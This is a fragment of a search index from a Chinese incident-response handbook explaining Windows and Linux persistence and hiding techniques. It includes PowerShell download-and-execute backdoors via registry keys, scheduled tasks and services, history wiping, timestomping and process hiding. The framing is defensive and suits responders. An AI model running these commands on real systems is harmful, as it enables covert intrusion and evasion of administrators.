monitor\u6355\u6349\u901a\u4fe1\u8fc7\u7a0b\uff0c\u6709\u89c4\u5f8b\u7684\u8bf7\u6c42\u53d6\u51b3\u4e8esleep\u8bbe\u7f6e\u7684\u95f4\u9694\u3002","title":"0x04 \u8fdb\u7a0b\u6ce8\u5165"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC03%E7%AB%A0%EF%BC%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9AWindows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E9%9A%90%E8%97%8F%E7%AF%87/#0x05--\u7ed3\u675f","text":"\u672c\u6587\u4e3b\u8981\u4ecb\u7ecd\u4e86Window\u4e0b\u7684\u51e0\u79cd\u9690\u85cf\u6280\u672f\uff0c\u5305\u62ec\u9690\u85cf\u6587\u4ef6\u3001\u9690\u85cf\u8d26\u53f7\u3001\u7aef\u53e3\u590d\u7528\u3001\u8fdb\u7a0b\u6ce8\u5165\u7b49\u65b9\u9762\u7684\u7b80\u5355\u5b9e\u73b0\u53ca\u5176\u6392\u67e5\u6280\u5de7\u3002\u4ec5\u4f5c\u629b\u7816\u5f15\u7389\u4e4b\u7528\uff0c\u6b22\u8fce\u7559\u8a00\u5206\u4eab\u3002","title":"0x05  \u7ed3\u675f"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC03%E7%AB%A0%EF%BC%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E7%AF%87/%E7%AC%AC2%E7%AF%87%EF%BC%9AWindows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E5%90%8E%E9%97%A8%E7%AF%87/","text":"\u5173\u952e\u8bcd\uff1aWindows\u7cfb\u7edf\u540e\u95e8\u3001\u6743\u9650\u7ef4\u6301 \u5728\u83b7\u53d6\u670d\u52a1\u5668\u6743\u9650\u540e\uff0c\u901a\u5e38\u4f1a\u7528\u4e00\u4e9b\u540e\u95e8\u6280\u672f\u6765\u7ef4\u6301\u670d\u52a1\u5668\u6743\u9650\uff0c\u670d\u52a1\u5668\u4e00\u65e6\u88ab\u690d\u5165\u540e\u95e8\uff0c\u653b\u51fb\u8005\u4fbf\u5982\u5165\u65e0\u4eba\u4e4b\u5883\u3002\u672c\u6587\u5c06\u5bf9\u5e38\u89c1\u7684window\u670d\u52a1\u7aef\u81ea\u542f\u52a8\u540e\u95e8\u6280\u672f\u8fdb\u884c\u89e3\u6790\uff0c\u77e5\u5df1\u77e5\u5f7c\u65b9\u80fd\u675c\u7edd\u540e\u95e8\u3002 0x01 \u6ce8\u518c\u8868\u81ea\u542f\u52a8 \u901a\u8fc7\u4fee\u6539\u6ce8\u518c\u8868\u81ea\u542f\u52a8\u952e\u503c\uff0c\u6dfb\u52a0\u4e00\u4e2a\u6728\u9a6c\u7a0b\u5e8f\u8def\u5f84\uff0c\u5b9e\u73b0\u5f00\u673a\u81ea\u542f\u52a8\u3002 \u5e38\u7528\u7684\u6ce8\u518c\u8868\u542f\u52a8\u952e\uff1a # Run\u952e HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run # Winlogon\\Userinit\u952e HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Winlogon HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Winlogon \u7c7b\u4f3c\u7684\u8fd8\u6709\u5f88\u591a,\u5173\u952e\u8bcd\uff1a\u6ce8\u518c\u8868\u542f\u52a8\u952e\u503c\u3002 \u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u53ef\u4ee5\u4e00\u952e\u5b9e\u73b0\u65e0\u6587\u4ef6\u6ce8\u518c\u8868\u540e\u95e8\uff1a reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Keyname\" /t REG_SZ /d \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://192.168.28.142:8888/logo.gif'))\\\"\" /f Logon Scripts \u540e\u95e8 \u6ce8\u518c\u8868\u8def\u5f84\uff1aHKEY_CURRENT_USER\\Environment\\ \u521b\u5efa\u5b57\u7b26\u4e32\u952e\u503c\uff1a UserInitMprLogonScript\uff0c\u952e\u503c\u8bbe\u7f6e\u4e3abat\u7684\u7edd\u5bf9\u8def\u5f84\uff1a c:\\test.bat userinit\u540e\u95e8 \u5728\u7528\u6237\u8fdb\u884c\u767b\u9646\u65f6\uff0cwinlogon\u8fd0\u884c\u6307\u5b9a\u7684\u7a0b\u5e8f\u3002\u6839\u636e\u5b98\u65b9\u6587\u6863,\u53ef\u4ee5\u66f4\u6539\u5b83\u7684\u503c\u6765\u6dfb\u52a0\u4e0e\u5220\u9664\u7a0b\u5e8f\u3002 \u5229\u7528USERINIT\u6ce8\u518c\u8868\u952e\u5b9e\u73b0\u65e0\u6587\u4ef6\u540e\u95e8\uff1a [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon] \"Userinit\"=\"C:\\\\Windows\\\\system32\\\\userinit.exe,C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://192.168.28.142:8888/logo.gif'))\\\"\" 0x02 \u7ec4\u7b56\u7565\u8bbe\u7f6e\u811a\u672c\u542f\u52a8 \u8fd0\u884cgpedit.msc\u8fdb\u5165\u672c\u5730\u7ec4\u7b56\u7565\uff0c\u901a\u8fc7Windows\u8bbe\u7f6e\u7684\u201c\u811a\u672c(\u542f\u52a8/\u5173\u673a)\u201d\u9879\u6765\u8bf4\u5b9e\u73b0\u3002\u56e0\u4e3a\u5176\u6781\u5177\u9690\u853d\u6027\uff0c\u56e0\u6b64\u5e38\u5e38\u88ab\u653b\u51fb\u8005\u5229\u7528\u6765\u505a\u670d\u52a1\u5668\u540e\u95e8\u3002 \u5bb9\u6613\u9047\u5230\u7684\u95ee\u9898\uff1a\u811a\u672c\u9700\u5168\u8def\u5f84\uff0c\u5982 C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe 0x03 \u8ba1\u5212\u4efb\u52a1 \u901a\u8fc7window\u7cfb\u7edf\u7684\u4efb\u52a1\u8ba1\u5212\u7a0b\u5e8f\u529f\u80fd\u5b9e\u73b0\u5b9a\u65f6\u542f\u52a8\u67d0\u4e2a\u4efb\u52a1\uff0c\u6267\u884c\u67d0\u4e2a\u811a\u672c\u3002 \u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u53ef\u4ee5\u4e00\u952e\u5b9e\u73b0\uff1a schtasks /create /sc minute /mo 1 /tn \"Security Script\" /tr \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring(\\\"\\\"\\\"http://192.168.28.142:8888/logo.gif\\\"\\\"\\\"))\\\"\" \u5bb9\u6613\u9047\u5230\u7684\u95ee\u9898\uff1acmd\u547d\u4ee4\u884c\u6267\u884c\u5355\u5f15\u53f7\u4f1a\u88ab\u66ff\u6362\u6210\u53cc\u5f15\u53f7\uff0c\u6545\u8fd9\u91cc\u4f7f\u7528\u4e09\u4e2a\u53cc\u5f15\u53f7\u66ff\u4ee3\u3002 \u8ba1\u5212\u811a\u672c\u6bcf 1 \u5206\u949f\u8fd0\u884c\u4e00\u6b21\u3002 0x04 \u670d\u52a1\u81ea\u542f\u52a8 \u901a\u8fc7\u670d\u52a1\u8bbe\u7f6e\u81ea\u542f\u52a8\uff0c\u7ed3\u5408powershell\u5b9e\u73b0\u65e0\u6587\u4ef6\u540e\u95e8\u3002 \u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u53ef\u5b9e\u73b0\uff1a sc create \"KeyName\" binpath= \"cmd /c start powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://192.168.28.142:8888/logo.gif'))\\\"\" sc description KeyName \"Just For Test\" //\u8bbe\u7f6e\u670d\u52a1\u7684\u63cf\u8ff0\u5b57\u7b26\u4e32 sc config Name start= auto //\u8bbe\u7f6e\u8fd9\u4e2a\u670d\u52a1\u4e3a\u81ea\u52a8\u542f\u52a8 net start Name //\u542f\u52a8\u670d\u52a1 \u6210\u529f\u521b\u5efa\u4e86\u4e00\u4e2a\u81ea\u542f\u52a8\u670d\u52a1 0x05 WMI\u540e\u95e8 \u57282015\u5e74\u7684blackhat\u5927\u4f1a\u4e0aMatt Graeber\u4ecb\u7ecd\u4e86\u4e00\u79cd\u65e0\u6587\u4ef6\u540e\u95e8\u5c31\u662f\u7528\u7684WMI\u3002\u8fd9\u91cc\u53ef\u4ee5\u5229\u7528\u4e00\u4e2a\u5de5\u5177powersploit\uff0c\u4e0b\u9762\u7528\u5b83\u7684Persistence\u6a21\u5757\u6765\u793a\u8303\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u3002 Import-Module .\\Persistence\\Persistence.psm1 $ElevatedOptions = New-ElevatedPersistenceOption -PermanentWMI -Daily -At '3 PM' $UserOptions = New-UserPersistenceOption -Registry -AtLogon Add-Persistence -FilePath .\\EvilPayload.ps1 -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -Verbose 0x06 dll\u52ab\u6301 \u5982\u679c\u5728\u8fdb\u7a0b\u5c1d\u8bd5\u52a0\u8f7d\u4e00\u4e2aDLL\u65f6\u6ca1\u6709\u6307\u5b9aDLL\u7684\u7edd\u5bf9\u8def\u5f84\uff0c\u90a3\u4e48Windows\u4f1a\u5c1d\u8bd5\u53bb\u6307\u5b9a\u7684\u76ee\u5f55\u4e0b\u67e5\u627e\u8fd9\u4e2aDLL\uff1b\u5982\u679c\u653b\u51fb\u8005\u80fd\u591f\u63a7\u5236\u5176\u4e2d\u7684\u67d0\u4e00 \u4e2a\u76ee\u5f55\uff0c\u5e76\u4e14\u653e\u4e00\u4e2a\u6076\u610f\u7684DLL\u6587\u4ef6\u5230\u8fd9\u4e2a\u76ee\u5f55\u4e0b\uff0c\u8fd9\u4e2a\u6076\u610f\u7684DLL\u4fbf\u4f1a\u88ab\u8fdb\u7a0b\u6240\u52a0\u8f7d\uff0c\u4ece\u800c\u9020\u6210\u4ee3\u7801\u6267\u884c\u3002 \u6bd4\u8f83\u5e38\u7528\u7684\u5982LPK.dll\u7684\u52ab\u6301\uff1a win7\u53cawin7\u4ee5\u4e0a\u7cfb\u7edf\u589e\u52a0\u4e86KnownDLLs\u4fdd\u62a4\uff0c\u9700\u8981\u5728\u6ce8\u518c\u8868\uff1a HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SessionManager\\ExcludeFromKnownDlls \u4e0b\u6dfb\u52a0 \u201clpk.dll\u201d \u624d\u80fd\u987a\u5229\u52ab\u6301\uff1a 0x07 COM\u52ab\u6301 \u5229\u7528COM\u52ab\u6301\u6280\u672f\uff0c\u6700\u4e3a\u5173\u952e\u7684\u662fdll\u7684\u5b9e\u73b0\u4ee5\u53caCLSID\u7684\u9009\u62e9\uff0c\u901a\u8fc7\u4fee\u6539CLSID\u4e0b\u7684\u6ce8\u518c\u8868\u952e\u503c\uff0c\u5b9e\u73b0\u5bf9CAccPropServicesClass\u548cMMDeviceEnumerator\u52ab\u6301\uff0c\u800c\u7cfb\u7edf\u5f88\u591a\u6b63\u5e38\u7a0b\u5e8f\u542f\u52a8\u65f6\u9700\u8981\u8c03\u7528\u8fd9\u4e24\u4e2a\u5b9e\u4f8b\u3002\u8fd9\u79cd\u65b9\u6cd5\u53ef\u4ee5\u7ed5\u8fc7Autoruns\u5bf9\u542f\u52a8\u9879\u7684\u68c0\u6d4b\u3002 0x08 \u8fdc\u7a0b\u63a7\u5236 \u8fdc\u63a7\u6728\u9a6c\u662f\u4e00\u79cd\u6076\u610f\u7a0b\u5e8f\uff0c\u5176\u4e2d\u5305\u62ec\u5728\u76ee\u6807\u8ba1\u7b97\u673a\u4e0a\u7528\u4e8e\u7ba1\u7406\u63a7\u5236\u7684\u540e\u95e8\u3002\u8fdc\u7a0b\u8bbf\u95ee\u6728\u9a6c\u901a\u5e38\u4e0e\u7528\u6237\u8bf7\u6c42\u7684\u7a0b\u5e8f\uff08\u5982\u6e38\u620f\u7a0b\u5e8f\uff09\u4e00\u8d77\uff0c\u662f\u4e00\u79cd\u770b\u4e0d\u89c1\u7684\u4e0b\u8f7d\uff0c\u6216\u4f5c\u4e3a\u7535\u5b50\u90ae\u4ef6\u9644\u4ef6\u53d1\u9001\u3002\u4e00\u65e6\u4e3b\u673a\u7cfb\u7edf\u88ab\u653b\u7834\uff0c\u5165\u4fb5\u8005\u53ef\u4ee5\u5229\u7528\u5b83\u6765\u5411\u5176\u4ed6\u6613\u53d7\u611f\u67d3\u7684\u8ba1\u7b97\u673a\u5206\u53d1\u8fdc\u7a0b\u8bbf\u95ee\u6728\u9a6c\uff0c\u4ece\u800c\u5efa\u7acb\u50f5\u5c38\u7f51\u7edc\u3002 \u4e00\u822c\u5206\u4e3a\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\uff0c\u5982\uff1a\u7070\u9e3d\u5b50\u3001\u4e0a\u5174\u8fdc\u63a7\u3001\u68a6\u60f3\u65f6\u4ee3\u3001QuasarRAT\u7b49\u3002 0x09 \u7ed3\u675f\u8bed \u672a\u77e5\u653b\u7109\u77e5\u9632\uff0c\u672c\u6587\u5206\u4eab\u4e86\u51e0\u79cdWindow\u4e0b\u7684\u81ea\u52a8\u542f\u6743\u9650\u7ef4\u6301\u6280\u672f\u3002\u7ba1\u7406\u5458\u5728\u5e73\u65f6\u8fd0\u7ef4\u8fc7\u7a0b\u5e94\u5f53\u4fdd\u6301\u8b66\u60d5\uff0c\u638c\u63e1\u4e00\u5b9a\u7684\u5165\u4fb5\u6392\u67e5\u6280\u5de7\uff0c\u53ca\u65f6\u8fdb\u884c\u7cfb\u7edf\u8865\u4e01\u66f4\u65b0\uff0c\u5b9a\u671f\u5bf9\u670d\u52a1\u5668\u5b89\u5168\u68c0\u67e5\uff0c\u624d\u80fd\u6709\u6548\u5730\u9884\u9632\u540e\u95e8\u3002","title":"\u7b2c2\u7bc7\uff1aWindows\u6743\u9650\u7ef4\u6301--\u540e\u95e8\u7bc7"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC03%E7%AB%A0%EF%BC%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E7%AF%87/%E7%AC%AC3%E7%AF%87%EF%BC%9ALinux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E9%9A%90%E8%97%8F%E7%AF%87/","text":"0x00 \u524d\u8a00 \u00b6 \u653b\u51fb\u8005\u5728\u83b7\u53d6\u670d\u52a1\u5668\u6743\u9650\u540e\uff0c\u4f1a\u901a\u8fc7\u4e00\u4e9b\u6280\u5de7\u6765\u9690\u85cf\u81ea\u5df1\u7684\u8e2a\u8ff9\u548c\u540e\u95e8\u6587\u4ef6\uff0c\u672c\u6587\u4ecb\u7ecdLinux\u4e0b\u7684\u51e0\u79cd\u9690\u85cf\u6280\u672f\u3002 0x01 \u9690\u85cf\u6587\u4ef6 \u00b6 Linux \u4e0b\u521b\u5efa\u4e00\u4e2a\u9690\u85cf\u6587\u4ef6\uff1a touch .test.txt touch \u547d\u4ee4\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u6587\u4ef6\uff0c\u6587\u4ef6\u540d\u524d\u9762\u52a0\u4e00\u4e2a \u70b9 \u5c31\u4ee3\u8868\u662f\u9690\u85cf\u6587\u4ef6,\u5982\u4e0b\u56fe\uff1a \u4e00\u822c\u7684Linux\u4e0b\u7684\u9690\u85cf\u76ee\u5f55\u4f7f\u7528\u547d\u4ee4 ls -l \u662f\u67e5\u770b\u4e0d\u51fa\u6765\u7684\uff0c\u53ea\u80fd\u67e5\u770b\u5230\u6587\u4ef6\u53ca\u6587\u4ef6\u5939\uff0c\u67e5\u770bLinux\u4e0b\u7684\u9690\u85cf\u6587\u4ef6\u9700\u8981\u7528\u5230\u547d\u4ee4\uff1a ls -al \u8fd9\u91cc\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5728/tmp\u4e0b\uff0c\u9ed8\u8ba4\u5b58\u5728\u591a\u4e2a\u9690\u85cf\u76ee\u5f55\uff0c\u8fd9\u4e9b\u76ee\u5f55\u662f\u6076\u610f\u6587\u4ef6\u5e38\u7528\u6765\u85cf\u8eab\u7684\u5730\u65b9\u3002\u5982 /temp/.ICE-unix/\u3001/temp/.Test-unix/\u3001/temp/.X11-unix/\u3001/temp/.XIM-unix/ 0x02 \u9690\u85cf\u6587\u4ef6\u65f6\u95f4\u6233 \u00b6 Unix \u4e0b\u85cf\u540e\u95e8\u5fc5\u987b\u8981\u4fee\u6539\u65f6\u95f4\uff0c\u5426\u5219\u5f88\u5bb9\u6613\u88ab\u53d1\u73b0\uff0c\u76f4\u63a5\u5229\u7528 touch \u5c31\u53ef\u4ee5\u4e86\u3002 \u6bd4\u5982\u53c2\u8003 index.php \u7684\u65f6\u95f4\uff0c\u518d\u8d4b\u7ed9 webshell.php\uff0c\u7ed3\u679c\u4e24\u4e2a\u6587\u4ef6\u7684\u65f6\u95f4\u5c31\u4e00\u6837\u4e86\u3002 \u5229\u7528\u65b9\u6cd5 touch -r index.php webshell.php \u6216\u8005\u76f4\u63a5\u5c06\u65f6\u95f4\u6233\u4fee\u6539\u6210\u67d0\u5e74\u67d0\u6708\u67d0\u65e5\u3002\u5982\u4e0b 2014 \u5e74 01 \u6708 02 \u65e5\u3002 touch -t 1401021042.30 webshell.php 0x03 \u9690\u85cf\u6743\u9650 \u00b6 \u5728Linux\u4e2d\uff0c\u4f7f\u7528chattr\u547d\u4ee4\u6765\u9632\u6b62root\u548c\u5176\u4ed6\u7ba1\u7406\u7528\u6237\u8bef\u5220\u9664\u548c\u4fee\u6539\u91cd\u8981\u6587\u4ef6\u53ca\u76ee\u5f55\uff0c\u6b64\u6743\u9650\u7528ls -l\u662f\u67e5\u770b\u4e0d\u51fa\u6765\u7684\uff0c\u4ece\u800c\u8fbe\u5230\u9690\u85cf\u6743\u9650\u7684\u76ee\u7684\u3002 \u8fd9\u4e2a\u6280\u5de7\u5e38\u88ab\u7528\u5728\u540e\u95e8\uff0c\u53d8\u6210\u4e86\u4e00\u4e9b\u96be\u4ee5\u6e05\u9664\u7684\u540e\u95e8\u6587\u4ef6\uff0c\u4ee4\u5f88\u591a\u65b0\u624b\u670b\u53cb\u611f\u5230\u5934\u75bc\u3002 chattr +i evil.php \u9501\u5b9a\u6587\u4ef6 lsattr evil.php \u5c5e\u6027\u67e5\u770b chattr -i evil.php \u89e3\u9664\u9501\u5b9a rm -rf 1.evil.php \u5220\u9664\u6587\u4ef6 0x04 \u9690\u85cf\u5386\u53f2\u64cd\u4f5c\u547d\u4ee4 \u00b6 \u5728shell\u4e2d\u6267\u884c\u7684\u547d\u4ee4\uff0c\u4e0d\u5e0c\u671b\u88ab\u8bb0\u5f55\u5728\u547d\u4ee4\u884c\u5386\u53f2\u4e2d\uff0c\u5982\u4f55\u5728linux\u4e2d\u5f00\u542f\u65e0\u75d5\u64cd\u4f5c\u6a21\u5f0f\u5462\uff1f \u6280\u5de7\u4e00\uff1a\u53ea\u9488\u5bf9\u4f60\u7684\u5de5\u4f5c\u5173\u95ed\u5386\u53f2\u8bb0\u5f55 [space]set +o history \u5907\u6ce8\uff1a[space] \u8868\u793a\u7a7a\u683c\u3002\u5e76\u4e14\u7531\u4e8e\u7a7a\u683c\u7684\u7f18\u6545\uff0c\u8be5\u547d\u4ee4\u672c\u8eab\u4e5f\u4e0d\u4f1a\u88ab\u8bb0\u5f55\u3002 \u4e0a\u9762\u7684\u547d\u4ee4\u4f1a\u4e34\u65f6\u7981\u7528\u5386\u53f2\u529f\u80fd\uff0c\u8fd9\u610f\u5473\u7740\u5728\u8fd9\u547d\u4ee4\u4e4b\u540e\u4f60\u6267\u884c\u7684\u6240\u6709\u64cd\u4f5c\u90fd\u4e0d\u4f1a\u8bb0\u5f55\u5230\u5386\u53f2\u4e2d\uff0c\u7136\u800c\u8fd9\u4e2a\u547d\u4ee4\u4e4b\u524d\u7684\u6240\u6709\u4e1c\u897f\u90fd\u4f1a\u539f\u6837\u8bb0\u5f55\u5728\u5386\u53f2\u5217\u8868\u4e2d\u3002 \u8981\u91cd\u65b0\u5f00\u542f\u5386\u53f2\u529f\u80fd\uff0c\u6267\u884c\u4e0b\u9762\u7684\u547d\u4ee4\uff1a [Space]set -o history \u5b83\u5c06\u73af\u5883\u6062\u590d\u539f\u72b6\uff0c\u4e5f\u5c31\u662f\u4f60\u5b8c\u6210\u4e86\u4f60\u7684\u5de5\u4f5c\uff0c\u6267\u884c\u4e0a\u8ff0\u547d\u4ee4\u4e4b\u540e\u7684\u547d\u4ee4\u90fd\u4f1a\u51fa\u73b0\u5728\u5386\u53f2\u4e2d\u3002 \u6280\u5de7\u4e8c\uff1a\u4ece\u5386\u53f2\u8bb0\u5f55\u4e2d\u5220\u9664\u6307\u5b9a\u7684\u547d\u4ee4 \u5047\u8bbe\u5386\u53f2\u8bb0\u5f55\u4e2d\u5df2\u7ecf\u5305\u542b\u4e86\u4e00\u4e9b\u4f60\u4e0d\u5e0c\u671b\u8bb0\u5f55\u7684\u547d\u4ee4\u3002\u8fd9\u79cd\u60c5\u51b5\u4e0b\u6211\u4eec\u600e\u4e48\u529e\uff1f\u5f88\u7b80\u5355\u3002\u901a\u8fc7\u4e0b\u9762\u7684\u547d\u4ee4\u6765\u5220\u9664\uff1a history | grep \"keyword\" \u8f93\u51fa\u5386\u53f2\u8bb0\u5f55\u4e2d\u5339\u914d\u7684\u547d\u4ee4\uff0c\u6bcf\u4e00\u6761\u524d\u9762\u4f1a\u6709\u4e2a\u6570\u5b57\u3002\u4ece\u5386\u53f2\u8bb0\u5f55\u4e2d\u5220\u9664\u90a3\u4e2a\u6307\u5b9a\u7684\u9879\uff1a history -d [num] \u8fd9\u79cd\u6280\u5de7\u662f\u5173\u952e\u8bb0\u5f55\u5220\u9664\uff0c\u6216\u8005\u6211\u4eec\u53ef\u4ee5\u66b4\u529b\u70b9\uff0c\u6bd4\u5982\u524d150\u884c\u662f\u7528\u6237\u7684\u6b63\u5e38\u64cd\u4f5c\u8bb0\u5f55\uff0c150\u4ee5\u540e\u662f\u653b\u51fb\u8005\u64cd\u4f5c\u8bb0\u5f55\u3002\u6211\u4eec\u53ef\u4ee5\u53ea\u4fdd\u7559\u6b63\u5e38\u7684\u64cd\u4f5c\uff0c\u5220\u9664\u653b\u51fb\u75d5\u8ff9\u7684\u5386\u53f2\u64cd\u4f5c\u8bb0\u5f55\uff0c\u8fd9\u91cc\uff0c\u6211\u4eec\u53ea\u4fdd\u7559\u524d150\u884c\uff1a sed -i '150,$d' .bash_history 0x05 \u9690\u85cf\u8fdc\u7a0bSSH\u767b\u9646\u8bb0\u5f55 \u00b6 \u9690\u8eab\u767b\u5f55\u7cfb\u7edf\uff0c\u4e0d\u4f1a\u88abw\u3001who\u3001last\u7b49\u6307\u4ee4\u68c0\u6d4b\u5230\u3002 \u00b6 ssh -T root@127.0.0.1 /bin/bash -i \u4e0d\u8bb0\u5f55ssh\u516c\u94a5\u5728\u672c\u5730.ssh\u76ee\u5f55\u4e2d ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash \u2013i 0x06 \u7aef\u53e3\u590d\u7528 \u00b6 \u901a\u8fc7\u7aef\u53e3\u590d\u7528\u6765\u8fbe\u5230\u9690\u85cf\u7aef\u53e3\u7684\u76ee\u7684\uff0c\u5728Linux\u4e0b\uff0c\u5982\u4f55\u5b9e\u73b0\u7aef\u53e3\u590d\u7528\u5462\uff1f \u7b2c\u4e00\u79cd\u65b9\u5f0f\uff1a\u901a\u8fc7SSLH\u5728\u540c\u4e00\u7aef\u53e3\u4e0a\u5171\u4eabSSH\u4e0eHTTPS #\u5b89\u88c5SSLH sudo apt-get install sslh #\u914d\u7f6eSSLH \u7f16\u8f91 SSLH \u914d\u7f6e\u6587\u4ef6\uff1a sudo vi /etc/default/sslh 1\u3001\u627e\u5230\u4e0b\u5217\u884c\uff1aRun=no \u5c06\u5176\u4fee\u6539\u4e3a\uff1aRun=yes 2\u3001\u4fee\u6539\u4ee5\u4e0b\u884c\u4ee5\u5141\u8bb8 SSLH \u5728\u6240\u6709\u53ef\u7528\u63a5\u53e3\u4e0a\u4fa6\u542c\u7aef\u53e3 443 DAEMON_OPTS=\"--user sslh --listen 0.0.0.0:443 --ssh 127.0.0.1:22 --ssl 127.0.0.1:443 --pidfile /var/run/sslh/sslh.pid\" \u7b2c\u4e8c\u79cd\u65b9\u5f0f\uff1a\u5229\u7528IPTables\u8fdb\u884c\u7aef\u53e3\u590d\u7528 # \u7aef\u53e3\u590d\u7528\u94fe iptables -t nat -N LETMEIN # \u7aef\u53e3\u590d\u7528\u89c4\u5219 iptables -t nat -A LETMEIN -p tcp -j REDIRECT --to-port 22 # \u5f00\u542f\u5f00\u5173 iptables -A INPUT -p tcp -m string --string 'threathuntercoming' --algo bm -m recent --set --name letmein --rsource -j ACCEPT # \u5173\u95ed\u5f00\u5173 iptables -A INPUT -p tcp -m string --string 'threathunterleaving' --algo bm -m recent --name letmein --remove -j ACCEPT # let's do it iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN \u5229\u7528\u65b9\u5f0f\uff1a #\u5f00\u542f\u590d\u7528 echo threathuntercoming | socat - tcp:192.168.28.128:80 #ssh\u4f7f\u752880\u7aef\u53e3\u8fdb\u884c\u767b\u5f55 ssh -p 80 root@192.168.28.128 #\u5173\u95ed\u590d\u7528 echo threathunterleaving | socat - tcp:192.168.28.128:80 \u5177\u4f53\u6587\u7ae0\u8be6\u89c1\uff1a \u8fdc\u7a0b\u9065\u63a7 IPTables \u8fdb\u884c\u7aef\u53e3\u590d\u7528 0x07 \u8fdb\u7a0b\u9690\u85cf \u00b6 \u7ba1\u7406\u5458\u65e0\u6cd5\u901a\u8fc7\u76f8\u5173\u547d\u4ee4\u5de5\u5177\u67e5\u627e\u5230\u4f60\u8fd0\u884c\u7684\u8fdb\u7a0b\uff0c\u4ece\u800c\u8fbe\u5230\u9690\u85cf\u76ee\u7684\uff0c\u5b9e\u73b0\u8fdb\u7a0b\u9690\u85cf\u3002 \u7b2c\u4e00\u79cd\u65b9\u6cd5\uff1alibprocesshider github\u9879\u76ee\u5730\u5740\uff1a https://github.com/gianlucaborello/libprocesshider \u5229\u7528 LD_PRELOAD \u6765\u5b9e\u73b0\u7cfb\u7edf\u51fd\u6570\u7684\u52ab\u6301\uff0c\u5b9e\u73b0\u5982\u4e0b # \u4e0b\u8f7d\u7a0b\u5e8f\u7f16\u8bd1 git clone https://github.com/gianlucaborello/libprocesshider.git cd libprocesshider/ && make # \u79fb\u52a8\u6587\u4ef6\u5230/usr/local/lib/\u76ee\u5f55\u4e0b cp libprocesshider.so /usr/local/lib/ # \u628a\u5b83\u52a0\u8f7d\u5230\u5168\u5c40\u52a8\u6001\u8fde\u63a5\u5c40 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload \u6d4b\u8bd5\uff1a\u8fd0\u884c evil_script.py\uff0c \u6b64\u65f6\u53d1\u73b0\u5728top \u4e0e ps \u4e2d\u90fd\u65e0\u6cd5\u627e\u5230 evil_script.py\uff0c cpu \u4f7f\u7528\u7387\u9ad8,\u4f46\u662f\u5374\u627e\u4e0d\u5230\u4efb\u4f55\u5360\u7528cpu\u9ad8\u7684\u7a0b\u5e8f\u3002 \u5982\u4f55\u5728Linux\u4e2d\u53d1\u73b0\u9690\u85cf\u7684\u8fdb\u7a0b\uff0c unhide \u662f\u4e00\u4e2a\u5c0f\u5de7\u7684\u7f51\u7edc\u53d6\u8bc1\u5de5\u5177\uff0c\u80fd\u591f\u53d1\u73b0\u90a3\u4e9b\u501f\u52a9rootkit\uff0cLKM\u53ca\u5176\u5b83\u6280\u672f\u9690\u85cf\u7684\u8fdb\u7a0b\u548cTCP / UDP\u7aef\u53e3\u3002\u8fd9\u4e2a\u5de5\u5177\u5728Linux\uff0cUNIX\u7c7b\uff0cMS-Windows\u7b49\u64cd\u4f5c\u7cfb\u7edf\u4e0b\u90fd\u53ef\u4ee5\u5de5\u4f5c\u3002 \u4e0b\u8f7d\u5730\u5740\uff1a http://www.unhide-forensics.info/ # \u5b89\u88c5 sudo yum install unhide # \u4f7f\u7528 unhide [options] test_list \u4f7f\u7528 unhide proc \u53d1\u73b0\u9690\u85cf\u8fdb\u7a0bevil_script.py\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a \u7b2c\u4e8c\u79cd\u65b9\u6cd5\uff1a\u8fdb\u7a0b\u6ce8\u5165\u5de5\u5177linux-inject linux-inject\u662f\u7528\u4e8e\u5c06\u5171\u4eab\u5bf9\u8c61\u6ce8\u5165Linux\u8fdb\u7a0b\u7684\u5de5\u5177 github\u9879\u76ee\u5730\u5740\uff1a https://github.com/gaffe23/linux-inject.git # \u4e0b\u8f7d\u7a0b\u5e8f\u7f16\u8bd1 git clone https://github.com/gaffe23/linux-inject.git cd linux-inject && make # \u6d4b\u8bd5\u8fdb\u7a0b ./sample-target # \u8fdb\u7a0b\u6ce8\u5165 ./inject -n sample-target sample-library.so 